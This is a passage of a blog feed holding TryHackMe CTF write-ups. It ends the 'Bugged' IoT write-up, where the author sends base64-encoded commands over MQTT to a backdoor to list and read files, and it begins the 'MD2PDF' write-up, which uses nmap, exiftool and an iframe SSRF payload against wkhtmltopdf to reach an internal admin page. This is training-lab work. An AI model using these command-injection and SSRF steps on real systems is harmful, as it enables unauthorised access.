we use subscriber id “XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub‘ and send a message to the subscriber.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"89e0\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">mosquitto_pub -t <span class=\"hljs-string\">\"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\"</span> -m <span class=\"hljs-string\">\"simple_massage\"</span> -h 10.10.20.204</span></pre>\n<p id=\"2817\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In here ‘-m’ flag for our massage. Let’s check what subscribers got.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"8db2\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak<span class=\"hljs-keyword\">@kali</span> ~ mosquitto_sub -t <span class=\"hljs-string\">\"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span><br><br>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=</span></pre>\n<p id=\"2e16\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Another base64 encoded string. Now we are going to decode the base64 string.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"4f8c\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak@kali ~ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=\"</span> | <span class=\"hljs-built_in\">base64</span> -d<br>Invalid message format.<br>Format: <span class=\"hljs-built_in\">base64</span>({<span class=\"hljs-string\">\"id\"</span>: <span class=\"hljs-string\">\"&lt;backdoor id&gt;\"</span>, <span class=\"hljs-string\">\"cmd\"</span>: <span class=\"hljs-string\">\"&lt;command&gt;\"</span>, <span class=\"hljs-string\">\"arg\"</span>: <span class=\"hljs-string\">\"&lt;argument&gt;\"</span>})%</span></pre>\n<p id=\"fd8f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Interesting! we got a massage format and the communication is base64 decoded. Here MQTT was expecting a base64 decoded massage and also want ‘id’, ‘cmd’, and ‘arg’. So, let’s make things right.</p>\n<p id=\"c803\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Beginning we got ‘id’ = “cdd1b1c0–1c40–4b0f-8e22–61b357548b7d” and it’s accepting cmd “‘HELP’, ‘CMD’, ‘SYS’”. We are going to use “CMD’ and as ‘arg’ we are going to use “ls”.</p>\n<p id=\"72c3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">The massage will be:</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"715b\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-punctuation\">{</span><span class=\"hljs-attr\">\"id\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cdd1b1c0–1c40–4b0f-8e22–61b357548b7d\"</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-attr\">\"cmd\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"CMD\"</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-attr\">\"arg\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"ls\"</span><span class=\"hljs-punctuation\">}</span></span></pre>\n<p id=\"57c9\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we need to encode it on base:</p>\n<pre id=\"abfa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\">“e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==”</pre>\n<p id=\"02d3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we send this base64 string as a massage. Our command will be:</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"0f02\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-keyword\">@kali</span> ~ mosquitto_pub -t <span class=\"hljs-string\">\"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\"</span> -m <span class=\"hljs-string\">\"e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span></span></pre>\n<p id=\"d217\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">We received something encoded in base64.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"6762\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-keyword\">@kali</span> ~ mosquitto_sub -t <span class=\"hljs-string\">\"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9</span></pre>\n<p id=\"8764\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">After Decode the base64 string finds a text file called “flag .txt”</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"97a4\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak@kali ~ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9\"</span> | <span class=\"hljs-built_in\">base64</span> -d<br><br>{<span class=\"hljs-string\">\"id\"</span>:<span class=\"hljs-string\">\"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\"</span>,<span class=\"hljs-string\">\"response\"</span>:<span class=\"hljs-string\">\"flag.txt\\n}</span></span></pre>\n<p id=\"0704\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">So, Let’s grab our flag. For that, we have to change the argument. And it will be ‘arg’ “cat flag.txt”</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"a03d\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-punctuation\">{</span><span class=\"hljs-attr\">\"id\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cdd1b1c0–1c40–4b0f-8e22–61b357548b7d\"</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-attr\">\"cmd\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"CMD\"</span><span class=\"hljs-punctuation\">,</span> <span class=\"hljs-attr\">\"arg\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"cat flag.txt\"</span><span class=\"hljs-punctuation\">}</span></span></pre>\n<pre class=\"fo abx abp anr bo ans ba bj\"><span id=\"d6be\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak@kali ~ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"{\"</span><span class=\"hljs-built_in\">id</span><span class=\"hljs-string\">\": \"</span>cdd1b1c0–1c40–4b0f-8e22–61b357548b7d<span class=\"hljs-string\">\", \"</span>cmd<span class=\"hljs-string\">\": \"</span>CMD<span class=\"hljs-string\">\", \"</span>arg<span class=\"hljs-string\">\": \"</span><span class=\"hljs-built_in\">cat</span> flag.txt<span class=\"hljs-string\">\"}\"</span> | <span class=\"hljs-built_in\">base64</span><br><br>e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K</span></pre>\n<p id=\"d204\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">We have to decode it in base64 then we send another massage.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"0792\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak@kali ~ mosquitto_pub -t <span class=\"hljs-string\">\"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\"</span> -m <span class=\"hljs-string\">\"e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span></span></pre>\n<p id=\"164d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In our subscriber part, we receive another base64 massage.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"cb44\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-keyword\">@kali</span> ~ mosquitto_sub -t <span class=\"hljs-string\">\"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9</span></pre>\n<p id=\"86b7\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Hopefully, after decoding this string we’ll get our flag! Let’s see….</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"1bb5\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak@kali  ~/ctf/thm  <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9\"</span> | <span class=\"hljs-built_in\">base64</span> -d<br><br>{<span class=\"hljs-string\">\"id\"</span>:<span class=\"hljs-string\">\"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\"</span>,<span class=\"hljs-string\">\"response\"</span>:<span class=\"hljs-string\">\"flag{..........}</span></span></pre>\n<p id=\"4ad3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Bingoo!!! we got our CTF flag…….</p>\n<blockquote class=\"abq abr abs\">\n<p id=\"ef65\" class=\"xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p>\n</blockquote>\n<p id=\"4755\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Happy Hacking!!!!! See you next time in another post :)</p>\n<p id=\"d210\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Thanks for Reading!!</strong></p>\n<p id=\"caaa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Follow me on Twitter</strong>: <a class=\"af rn\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"a415\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Happy Bugged~</strong></p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "TryHackMe",
                   "Pentesting",
                   "IoT Security",
                   "IoT",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:40:33+06:00",
            "date_modified": "2024-01-07T10:40:33+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html",
            "title": "TryHackMe | MD2PDF | CTF Writeup",
            "summary": "MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;",
            "content_html": "<p id=\"1a74\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">MD2PDF</strong> 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…?</p>\n<p id=\"838c\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\"><strong>Difficulty =</strong> Easy</p>\n<p id=\"0d0c\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Challenges:</strong> PDF, Markdown, SSRF.</p>\n<p id=\"3dbc\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Beginning we start with Nmap scan. For scan we use ‘-sV’ flag to know about services &amp; versions. And we also use ‘-Pn’ flag to not ping to the server.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"2d3f\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-meta\">@kali</span>:<span class=\"hljs-operator\">~/</span>ctf$ sudo nmap <span class=\"hljs-operator\">-</span>sV <span class=\"hljs-operator\">-</span><span class=\"hljs-type\">Pn</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">39.142</span><br><span class=\"hljs-type\">Host</span> <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0</span>.19s latency).<br><span class=\"hljs-type\">Not</span> shown: <span class=\"hljs-number\">997</span> closed tcp ports (reset)<br><span class=\"hljs-type\">PORT</span> <span class=\"hljs-type\">STATE</span> <span class=\"hljs-type\">SERVICE</span> <span class=\"hljs-type\">VERSION</span><br><span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span> ssh <span class=\"hljs-type\">OpenSSH</span> <span class=\"hljs-number\">8</span>.2p1 <span class=\"hljs-type\">Ubuntu</span> 4ubuntu0.<span class=\"hljs-number\">5</span> (<span class=\"hljs-type\">Ubuntu</span> <span class=\"hljs-type\">Linux</span>; <span class=\"hljs-keyword\">protocol</span> <span class=\"hljs-number\">2.0</span>)<br><span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span> rtsp<br><span class=\"hljs-number\">5000</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span> rtsp</span></pre>\n<p id=\"0245\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">It looks like there are 3 services running on the machine, the standard HTTP server on port 80, an SSH server and another HTTP server on port 5000. The host also appears to be running some version of Ubuntu Server.</p>\n<p id=\"de9c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Let’s checking the web server on port 80 shows that it converts markdown file to pdf.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anx\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*qLZ7jXKtWTsaqrzO9Kklvw.png\" alt=\"TryHackMe MD2PDF Writeup\" width=\"700\" height=\"293\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"dda0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Here if i include any markdown code it will be converted to pdf.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km any\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*MQ2gFGX98BxCS3CGdB2oCg.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"269\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"fc2c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">If I click on ‘Convert to PDF’ button then it’ll convert our Markdown code in PDF file.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*ZUzToTLxj9JCTW1RtyqypQ.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"259\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"88c7\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we’ll download the generated PDF file to check out the metadata.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"e2ba\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-string\">sak@kali:~/ctf$</span> <span class=\"hljs-string\">file</span> <span class=\"hljs-string\">document.pdf</span><br><span class=\"hljs-attr\">document.pdf:</span> <span class=\"hljs-string\">PDF</span> <span class=\"hljs-string\">document,</span> <span class=\"hljs-string\">version</span> <span class=\"hljs-number\">1.4</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-string\">pages</span><br><span class=\"hljs-string\">sak@kali:~/ctf$</span> <span class=\"hljs-string\">exiftool</span> <span class=\"hljs-string\">document.pdf</span><br><span class=\"hljs-attr\">ExifTool Version Number         :</span> <span class=\"hljs-number\">12.55</span><br><span class=\"hljs-attr\">File Name                       :</span> <span class=\"hljs-string\">document.pdf</span><br><span class=\"hljs-attr\">Directory                       :</span> <span class=\"hljs-string\">.</span><br><span class=\"hljs-attr\">File Size                       :</span> <span class=\"hljs-number\">7.4</span> <span class=\"hljs-string\">kB</span><br><span class=\"hljs-attr\">File Modification Date/Time     :</span> <span class=\"hljs-number\">2023</span><span class=\"hljs-string\">:02:20</span> <span class=\"hljs-number\">06</span><span class=\"hljs-string\">:48:03+06:00</span><br><span class=\"hljs-attr\">File Access Date/Time           :</span> <span class=\"hljs-number\">2023</span><span class=\"hljs-string\">:02:20</span> <span class=\"hljs-number\">20</span><span class=\"hljs-string\">:53:48+06:00</span><br><span class=\"hljs-attr\">File Inode Change Date/Time     :</span> <span class=\"hljs-number\">2023</span><span class=\"hljs-string\">:02:20</span> <span class=\"hljs-number\">20</span><span class=\"hljs-string\">:51:33+06:00</span><br><span class=\"hljs-attr\">File Permissions                :</span> <span class=\"hljs-string\">-rw-rw-r--</span><br><span class=\"hljs-attr\">File Type                       :</span> <span class=\"hljs-string\">PDF</span><br><span class=\"hljs-attr\">File Type Extension             :</span> <span class=\"hljs-string\">pdf</span><br><span class=\"hljs-attr\">MIME Type                       :</span> <span class=\"hljs-string\">application/pdf</span><br><span class=\"hljs-attr\">PDF Version                     :</span> <span class=\"hljs-number\">1.4</span><br><span class=\"hljs-attr\">Linearized                      :</span> <span class=\"hljs-literal\">No</span><br><span class=\"hljs-attr\">Title                           :</span> <br><span class=\"hljs-attr\">Creator                         :</span> <span class=\"hljs-string\">wkhtmltopdf</span> <span class=\"hljs-number\">0.12</span><span class=\"hljs-number\">.5</span><br><span class=\"hljs-attr\">Producer                        :</span> <span class=\"hljs-string\">Qt</span> <span class=\"hljs-number\">4.8</span><span class=\"hljs-number\">.7</span><br><span class=\"hljs-attr\">Create Date                     :</span> <span class=\"hljs-number\">2023</span><span class=\"hljs-string\">:02:20</span> <span class=\"hljs-number\">00</span><span class=\"hljs-string\">:36:44Z</span><br><span class=\"hljs-attr\">Page Count                      :</span> <span class=\"hljs-number\">1</span><br><span class=\"hljs-attr\">Page Mode                       :</span> <span class=\"hljs-string\">UseOutlines</span></span></pre>\n<p id=\"d43c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In here we see the creator name <code class=\"ff abm abn abo abp b\">wkhtmltopdf 0.12.5</code> we’ll search on google to know if there’s publicly known exploit for it.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anz\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*ZMwkdK6VRI1gnPgypxa1zw.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"357\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*FLeQ8hLjn_sGFML83rUyUw.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"359\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"6c8f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">After reading about the <a class=\"af rn\" href=\"https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently\" rel=\"noopener ugc nofollow\" target=\"_blank\">exploit</a> shows that we can use iframe tag and perform Server Side Request Forgery</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"8f25\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"><span class=\"hljs-title.class\">Payload</span>: &lt;iframe src=\"http://localhost/\" width=\"1000\" height=\"2000\"&gt;`</span></pre>\n<p id=\"ead4\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we if we paste this payload to input section and submit on ‘Convert to PDF button. It’s actually not worked</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*JDVQMlBq1k3ewvfT_lJG-A.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"297\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*VbRCo9BCm9S0zhRJLi9_iQ.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"240\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"735a\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we’ll run gobuster to find if there’s any interesting thing or directory.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aoa\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"367\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"c0ef\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">We got an admin directory which when accessed gives 403.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km anp\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*U355yK93I5_hRbSQKVIwFw.png\" alt=\"TryHackMe MD2PDF writeup\" width=\"700\" height=\"293\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"44aa\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">But we got an interesting massage that <strong class=\"ly kz\">it only be seen internally (localhost:5000).</strong></p>\n<p id=\"31e9\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we can use it as leverage the SSRF vulnerability and view the admin directory on port 5000.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km 